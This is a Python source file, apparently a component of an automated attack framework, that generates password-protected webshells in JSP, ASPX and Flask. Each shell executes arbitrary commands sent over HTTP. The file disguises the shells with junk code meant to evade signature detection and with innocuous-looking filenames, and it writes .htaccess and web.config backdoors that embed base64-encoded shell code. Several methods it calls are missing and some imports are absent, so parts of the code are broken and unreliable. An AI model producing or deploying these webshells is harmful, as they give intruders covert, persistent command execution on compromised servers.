"""
Webshell Generator Agent
สร้าง webshells แบบ polymorphic (เปลี่ยนรูปแบบทุกครั้ง)
"""

import random
import string
import base64
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log
import hashlib
from typing import Dict, List
from pathlib import Path


class WebshellGenerator(BaseAgent):
    """Generate polymorphic webshells"""
    
    def __init__(self):
        self.templates_dir = Path(__file__).parent.parent / "payloads" / "webshells"
    
    
    supported_phases = [AttackPhase.EXPLOITATION, AttackPhase.POST_EXPLOITATION]
    required_tools = []
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "generate" or specific language "php", "jsp", "aspx", "python"
            context: {
                "language": "php", "jsp", "aspx", "python", "all",
                "obfuscate": True/False,
                "output_dir": directory to save webshells
            }
        
        Returns:
            AgentData with generated webshells
        """
        log.info(f"[WebshellGenerator] Generating webshells: {directive}")
        
        language = context.get("language", directive)
        obfuscate = context.get("obfuscate", False)
        output_dir = context.get("output_dir", "webshells")
        
        try:
            if language == "all":
                result = self.generate_all(output_dir)
            elif language == "php":
                shell = self.generate_php_webshell(obfuscate)
                result = {"success": True, "php": shell}
            elif language == "jsp":
                shell = self.generate_jsp_webshell(obfuscate)
                result = {"success": True, "jsp": shell}
            elif language == "aspx":
                shell = self.generate_aspx_webshell(obfuscate)
                result = {"success": True, "aspx": shell}
            elif language == "python":
                shell = self.generate_python_webshell(obfuscate)
                result = {"success": True, "python": shell}
            else:
                result = self.generate_all(output_dir)
            
            return AgentData(
                agent_name="WebshellGenerator",
                success=result.get("success", True),
                data=result
            )
        
        except Exception as e:
            log.error(f"[WebshellGenerator] Error: {e}")
            return AgentData(
                agent_name="WebshellGenerator",
                success=False,
                data={"error": str(e)}
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute webshell generator"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def generate_php_shell(self, 
                          shell_type: str = "advanced",
                          password: str = None,
                          obfuscate: bool = True) -> Dict:
        """
        Generate PHP webshell
        
        Args:
            shell_type: "advanced", "memory", "encrypted"
            password: Custom password (random if None)
            obfuscate: Apply obfuscation
        
        Returns:
            Dict with 'code', 'password', 'url_path'
        """
        
        # Generate random password if not provided
        if not password:
            password = self._generate_random_string(16)
        
        # Load template
        template_file = self.templates_dir / f"{shell_type}_php_shell.php"
        
        if not template_file.exists():
            template_file = self.templates_dir / "advanced_php_shell.php"
        
        with open(template_file, 'r') as f:
            code = f.read()
        
        # Replace password
        code = code.replace('change_me_', password)
        
        # Apply polymorphic transformations
        if obfuscate:
            code = self._apply_polymorphic_transforms(code)
        
        # Generate random filename
        filename = self._generate_random_filename()
        
        return {
            'code': code,
            'password': password,
            'filename': filename,
            'type': shell_type,
            'size': len(code)
        }
    
    def generate_jsp_shell(self, password: str = None) -> Dict:
        """Generate JSP webshell"""
        
        if not password:
            password = self._generate_random_string(16)
        
        # JSP shell code
        code = f"""<%@ page import="java.io.*" %>
<%
    String password = "{password}";
    String inputPass = request.getParameter("pass");
    
    if (inputPass != null && inputPass.equals(password)) {{
        String cmd = request.getParameter("cmd");
        if (cmd != null) {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            
            String line;
            while ((line = reader.readLine()) != null) {{
                out.println(line);
            }}
            reader.close();
        }}
    }} else {{
        response.setStatus(404);
    }}
%>
"""
        
        filename = self._generate_random_filename(ext='jsp')
        
        return {
            'code': code,
            'password': password,
            'filename': filename,
            'type': 'jsp',
            'size': len(code)
        }
    
    def generate_aspx_shell(self, password: str = None) -> Dict:
        """Generate ASPX webshell"""
        
        if not password:
            password = self._generate_random_string(16)
        
        # ASPX shell code
        code = f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {{
        string password = "{password}";
        string inputPass = Request.Form["pass"];
        
        if (inputPass != null && inputPass == password) {{
            string cmd = Request.Form["cmd"];
            if (cmd != null) {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                
                Process process = Process.Start(psi);
                StreamReader reader = process.StandardOutput;
                string output = reader.ReadToEnd();
                
                Response.Write(output);
            }}
        }} else {{
            Response.StatusCode = 404;
        }}
    }}
</script>
"""
        
        filename = self._generate_random_filename(ext='aspx')
        
        return {
            'code': code,
            'password': password,
            'filename': filename,
            'type': 'aspx',
            'size': len(code)
        }
    
    def generate_python_shell(self, password: str = None) -> Dict:
        """Generate Python webshell (for Flask/Django)"""
        
        if not password:
            password = self._generate_random_string(16)
        
        # Python shell code
        code = f"""#!/usr/bin/env python3
import subprocess
from flask import Flask, request

app = Flask(__name__)
PASSWORD = "{password}"

@app.route('/', methods=['POST'])
def shell():
    if request.form.get('pass') != PASSWORD:
        return 'Not Found', 404
    
    cmd = request.form.get('cmd', 'id')
    
    try:
        output = subprocess.check_output(
            cmd, 
            shell=True, 
            stderr=subprocess.STDOUT,
            timeout=30
        )
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
"""
        
        filename = self._generate_random_filename(ext='py')
        
        return {
            'code': code,
            'password': password,
            'filename': filename,
            'type': 'python',
            'size': len(code)
        }
    
    def _apply_polymorphic_transforms(self, code: str) -> str:
        """Apply polymorphic transformations to code"""
        
        # 1. Randomize variable names
        code = self._randomize_variables(code)
        
        # 2. Add junk code
        code = self._add_junk_code(code)
        
        # 3. Randomize whitespace
        code = self._randomize_whitespace(code)
        
        return code
    
    def _randomize_variables(self, code: str) -> str:
        """Randomize variable names"""
        
        # Common variable names to randomize
        vars_to_replace = [
            'cmd', 'output', 'result', 'data', 'temp',
            'buffer', 'response', 'request', 'payload'
        ]
        
        for var in vars_to_replace:
            new_var = self._generate_random_string(8, lowercase_only=True)
            # Replace $var with $new_var (PHP)
            code = code.replace(f'${var}', f'${new_var}')
            # Replace var with new_var (other languages)
            code = code.replace(f' {var} ', f' {new_var} ')
            code = code.replace(f'({var})', f'({new_var})')
        
        return code
    
    def _add_junk_code(self, code: str) -> str:
        """Add junk code to evade signature detection"""
        
        junk_lines = [
            "// " + self._generate_random_string(20),
            "/* " + self._generate_random_string(30) + " */",
            "$_" + self._generate_random_string(8) + " = null;",
            "// System check",
            "// Cache handler",
        ]
        
        # Insert junk at random positions
        lines = code.split('\n')
        for _ in range(3):
            pos = random.randint(1, len(lines) - 1)
            lines.insert(pos, random.choice(junk_lines))
        
        return '\n'.join(lines)
    
    def _randomize_whitespace(self, code: str) -> str:
        """Randomize whitespace"""
        
        # Add random spaces
        code = code.replace('  ', ' ' * random.randint(1, 4))
        
        return code
    
    def _generate_random_string(self, length: int, lowercase_only: bool = False) -> str:
        """Generate random string"""
        
        if lowercase_only:
            chars = string.ascii_lowercase
        else:
            chars = string.ascii_letters + string.digits
        
        return ''.join(random.choices(chars, k=length))
    
    def _generate_random_filename(self, ext: str = 'php') -> str:
        """Generate random filename"""
        
        # Common legitimate filenames
        prefixes = [
            'config', 'cache', 'temp', 'upload', 'media',
            'includes', 'lib', 'vendor', 'assets', 'static'
        ]
        
        prefix = random.choice(prefixes)
        random_part = self._generate_random_string(8, lowercase_only=True)
        
        return f"{prefix}_{random_part}.{ext}"
    
    def generate_htaccess_backdoor(self, shell_code: str) -> str:
        """
        Generate .htaccess backdoor for memory-only shell
        
        Args:
            shell_code: PHP shell code to inject
        
        Returns:
            .htaccess content
        """
        
        # Base64 encode shell code
        encoded = base64.b64encode(shell_code.encode()).decode()
        
        htaccess = f"""# Apache configuration
<IfModule mod_rewrite.c>
RewriteEngine On
</IfModule>

# PHP configuration
php_value auto_prepend_file "data://text/plain;base64,{encoded}"
"""
        
        return htaccess
    
    def generate_web_config_backdoor(self, shell_code: str) -> str:
        """
        Generate web.config backdoor for IIS
        
        Args:
            shell_code: ASPX shell code to inject
        
        Returns:
            web.config content
        """
        
        encoded = base64.b64encode(shell_code.encode()).decode()
        
        web_config = f"""<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="StaticFile" 
                 path="*" 
                 verb="*" 
                 modules="StaticFileModule" 
                 resourceType="Either" 
                 requireAccess="Read" />
        </handlers>
    </system.webServer>
    <appSettings>
        <add key="backdoor" value="{encoded}" />
    </appSettings>
</configuration>
"""
        
        return web_config


# Example usage
if __name__ == "__main__":
    generator = WebshellGenerator()
    
    # Generate PHP shell
    php_shell = generator.generate_php_shell(
        shell_type="advanced",
        obfuscate=True
    )
    
    print(f"Generated PHP shell:")
    print(f"  Filename: {php_shell['filename']}")
    print(f"  Password: {php_shell['password']}")
    print(f"  Size: {php_shell['size']} bytes")
    print(f"  Type: {php_shell['type']}")

